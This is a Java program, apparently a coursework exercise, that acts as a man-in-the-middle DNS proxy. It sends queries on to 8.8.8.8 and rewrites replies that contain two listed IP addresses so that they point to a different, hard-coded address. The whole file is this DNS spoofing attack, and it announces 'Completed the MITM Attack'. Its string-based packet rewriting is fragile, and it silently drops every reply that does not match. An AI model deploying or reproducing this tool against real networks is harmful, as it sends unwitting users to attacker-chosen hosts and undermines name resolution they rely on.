import java.net.*;
import java.io.IOException;

public class mitm {
	private static DatagramSocket SRC, DEST;	
	private static final int HOME_PORT = 8008; // the port to dig on
	private static final int OUTS_PORT = 53; // to send/recv from Google
	private static final int P_SIZE = 512; // packet size, found to be <512
	// list of blocked IP addresses
    private static final String[] BLOCKED =  {"50.28.51.184", "208.80.154.224"};
	// where to redirect the IP addresses
    private static final String REDIREC = "139.157.100.6";	
	private static final String ROUTE = "8.8.8.8"; // google IP
	
	/**
	 * Main server loop
	 * continually polls for digs
	 */
	private static void serverLoop() {
		/**
		 * Add thread to poll for keyboard interrupts. Gracefully exit program
		 * when Ctrl+C (Linux) or Ctrl+Break (Windows) is pressed.
		 */
		Runtime.getRuntime().addShutdownHook(new Thread() {
			@Override
			public void run() {
				System.out.print("\nClosing sockets. SIGKILL to quit.\n\n");
				SRC.close(); DEST.close(); // close sockets
				System.exit(0); // gracefully exit
			}
		});
		while(true) {
			try {
				DatagramPacket p = new DatagramPacket(new byte[P_SIZE], P_SIZE);
				SRC.receive(p); // init p with some data
				// to not clobber later
				InetAddress addr = p.getAddress(); int port = p.getPort();
				System.out.print("A DNS request was received.\n");
				System.out.print("Rerouting packet to " + ROUTE + "... ");
				redirectPacket(p); // redirect packet to Google
				System.out.print("done!\n");
				p = new DatagramPacket(new byte[P_SIZE], P_SIZE); // for reply
				DEST.receive(p); // init reply
				System.out.print("Response from " + ROUTE + " was received.\n");
				byte[] b;
				if (checkIPMatch(p)) { // only if blocked IP found in pack
					System.out.print("Swapping IP addresses... ");
					b = ipSubstitution(p); // perform IP switching
					System.out.print("done!\n");
				} else { continue; } // otherwise halt current frame
				System.out.print("Sending DNS response back to source... ");
				// finish up
				SRC.send(new DatagramPacket(b, p.getLength(), addr, port));
				System.out.print("done!\n");
				System.out.println("Completed the MITM Attack.\n\n");
			} catch (Exception ex) {
				System.out.print("An error was encountered: " + ex + "\n\n");
				SRC.close(); DEST.close();
				System.exit(1);
			}
		}
	}
	
	/**
	 * Packet redirect
	 * Sends packet to Google to get a response to use later
	 * @param p - the packet to send
	 */
	private static void redirectPacket(DatagramPacket p) 
		throws UnknownHostException, IOException {
		InetAddress addr = InetAddress.getByName(ROUTE); // use addr for ROUT
		DEST.send(new DatagramPacket(p.getData(), P_SIZE, addr, OUTS_PORT));
	}
	
	/**
	 * IP Substitution
	 * Switches blocked IPs with a redirected IP
	 * @param p - the packet to change
	 * @return - a new packet, altered with changed IP
	 */
	private static byte[] ipSubstitution(DatagramPacket p) {
		byte[] b = p.getData(); // get byte array
		int mask = 0xFF; // to convert
		String bStr = ""; // convert byte array to string
		for (int i = 0; i < b.length; i++) {
			bStr += (int)(mask & b[i]) + ".";
		}
		// replacement of IPs
		for (int i = 0; i < BLOCKED.length; i++) { // for each blocked IP
			bStr = bStr.replaceAll(BLOCKED[i], REDIREC); // swap
		}
		// convert to array
		String[] byteString = bStr.split("\\.");
		// then convert back to byte array
		for (int i = 0; i < byteString.length; i++) {
			b[i] = (byte)(mask & Integer.parseInt(byteString[i]));
		}
		return b;
	}
	
	/**
	 * Verifies blocked IP is in packet
	 * @param p - the packet to inspect
	 * @return - whether a blocked IP is in there
	 */
	private static boolean checkIPMatch(DatagramPacket p) {
		byte[] b = p.getData(); // get byte array
		int mask = 0xFF; // to convert
		String bStr = ""; // convert bytearray to string
		for (int i = 0; i < b.length; i++) {
			bStr += (int)(mask & b[i]) + ".";
		}
		// check if blocked IP is within the UDP packet
		for (int i = 0; i < BLOCKED.length; i++) {
			if (bStr.indexOf(BLOCKED[i]) != -1) { // if found
				return true;
			}
		}
		return false; // else not found
	}
	
	/**
	 * Server setup
	 * Inits the sockets and handles errors
	 */
	private static void setup() {
		System.out.print("\nAttempting to set up server... ");
		try {
			SRC = new DatagramSocket(HOME_PORT); // where sending from
			DEST = new DatagramSocket(); // where sending to
		} catch (SocketException | SecurityException ex) {
			System.out.print("failed!\n\n");
			System.out.print("Error found was: " + ex + "\n\n");
			System.exit(1);
		}
		System.out.print("done!\n\n");
		System.out.print("You may quit with SIGINT.\n\n");
	}

	/**
	 * Main driver
	 */
	public static void main(String[] args) {
		setup(); // setup the sockets
	serverLoop(); // launch the server
		System.exit(0); // exit with normal exit code
	}
}
